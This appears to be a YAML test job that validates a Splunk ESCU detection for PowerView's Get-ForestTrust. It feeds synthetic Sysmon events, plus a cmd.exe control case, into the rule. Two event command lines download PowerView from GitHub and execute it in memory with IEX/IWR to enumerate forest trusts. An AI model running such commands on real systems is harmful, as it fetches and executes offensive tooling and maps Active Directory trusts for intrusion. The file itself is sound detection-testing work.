type: job
name: Get-ForestTrust with PowerShell
detection:
  source: escu
  name: "ESCU - Get-ForestTrust with PowerShell - Rule"
  id: 584f4884-0bf1-11ec-a5ec-acde48001122
description: |
  Validates detection of PowerView's Get-ForestTrust being run to enumerate
  the trusts leaving the current forest, which maps where a compromised
  account can reach beyond its own domain. Both shells the rule scopes to
  are covered; the control runs a cmd.exe shell with no forest-trust call.

mitre:
  tactics: [discovery]
  techniques: [T1482]

state:
  domain_short:       CORP
  domain_tld:         local
  domain_short_lower: fn.lower(ref.domain_short)
  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)

workloads:
  - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
    bindings:
      computer:     ref.computer
      command_line: "powershell.exe  -C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
    expectation:
      expected: alert
      summary: "powershell.exe loads PowerView and calls Get-ForestTrust"
      mitre:
        tactics: [discovery]
        techniques: [T1482]

  - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
    bindings:
      computer:            ref.computer
      command_line:        "cmd.exe  /c powershell.exe -C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
      image:               "C:\\Windows\\System32\\cmd.exe"
      original_file_name:  Cmd.Exe
      host_description:    Windows Command Processor
      file_version:        10.0.14393.0 (rs1_release.160715-1616)
      file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
    expectation:
      expected: alert
      summary: "The cmd.exe wrapper carries the forest-trust call on its own command line"
      mitre:
        tactics: [discovery]
        techniques: [T1482]

  - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
    bindings:
      computer:            ref.computer
      command_line:        "cmd.exe  /c powershell.exe Get-DomainSID"
      image:               "C:\\Windows\\System32\\cmd.exe"
      original_file_name:  Cmd.Exe
      host_description:    Windows Command Processor
      file_version:        10.0.14393.0 (rs1_release.160715-1616)
      file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
    expectation:
      expected: none
      summary: "A cmd.exe shell with no forest-trust call"
